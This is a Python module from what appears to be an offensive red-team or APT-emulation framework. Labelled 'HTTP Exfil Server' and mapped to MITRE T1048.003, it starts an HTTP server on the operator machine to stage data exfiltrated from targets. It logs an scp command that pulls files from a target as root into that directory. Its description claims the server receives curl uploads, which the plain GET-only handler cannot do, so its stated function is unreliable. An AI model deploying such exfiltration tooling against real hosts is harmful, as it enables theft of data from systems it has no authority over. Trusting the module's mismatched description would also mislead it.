import functools
import http.server
import logging
import os
import socketserver
import threading

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch


class http_server(APT_MODULE):
    name = "HTTP Exfil Server"
    description = (
        "Starts a Python stdlib HTTP server on the operator machine to host a staging "
        "directory. Use this to receive files exfiltrated from targets (e.g., via curl "
        "or wget on the target). Re-running while the server is active logs the current "
        "URL and the suggested curl upload command for each target."
    )
    tactic = AttackTactic.EXFILTRATION
    technique_id = "T1048.003"
    technique_name = "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
    compatible_os = [TargetOS.ANY]
    compatible_arch = [TargetArch.ANY]

    serve_host = "0.0.0.0"
    serve_port = 8000
    serve_dir = os.path.expanduser("~/apt_exfil")

    def __init__(self) -> None:
        super().__init__()
        self._httpd: socketserver.TCPServer | None = None
        self._server_thread: threading.Thread | None = None

    def _server_running(self) -> bool:
        return self._httpd is not None and self._server_thread is not None and self._server_thread.is_alive()

    def _start_server(self) -> bool:
        os.makedirs(self.serve_dir, exist_ok=True)
        handler = functools.partial(
            http.server.SimpleHTTPRequestHandler, directory=self.serve_dir)
        try:
            self._httpd = socketserver.TCPServer((self.serve_host, self.serve_port), handler)
            self._httpd.allow_reuse_address = True
            self._server_thread = threading.Thread(
                target=self._httpd.serve_forever, daemon=True)
            self._server_thread.start()
            return True
        except OSError as ex:
            logging.log(logging.ERROR, f"http_server start failed: {ex}")
            self._httpd = None
            return False

    def action(self, target: Target):
        if self._server_running():
            target.log_activity("HTTP server already running", True, MESSAGE_TYPE.INFORMATION)
        else:
            target.log_activity(
                f"Starting HTTP server on :{self.serve_port} serving {self.serve_dir}...", True)
            if self._start_server():
                target.log_activity(
                    f"HTTP server started – listening on {self.serve_host}:{self.serve_port}",
                    True, MESSAGE_TYPE.SUCCESS,
                )
            else:
                target.log_activity(
                    f"Failed to start HTTP server on port {self.serve_port}",
                    True, MESSAGE_TYPE.ERROR,
                )
                return

        # Log the staging directory and how to retrieve files from targets via SCP
        target.log_activity(
            f"Staging dir: {self.serve_dir}\n"
            f"Server is serving files from this directory via GET.\n"
            f"To pull files from {target.ip_label}, use SCP:\n"
            f"  scp {self.ssh_user if hasattr(self, 'ssh_user') else 'root'}@{target.ip_label}:/path/to/file {self.serve_dir}/\n"
            f"Files placed in {self.serve_dir} will be accessible at "
            f"http://<operator_ip>:{self.serve_port}/<filename>"
        )

    def enable(self, e):
        self.enabled = e
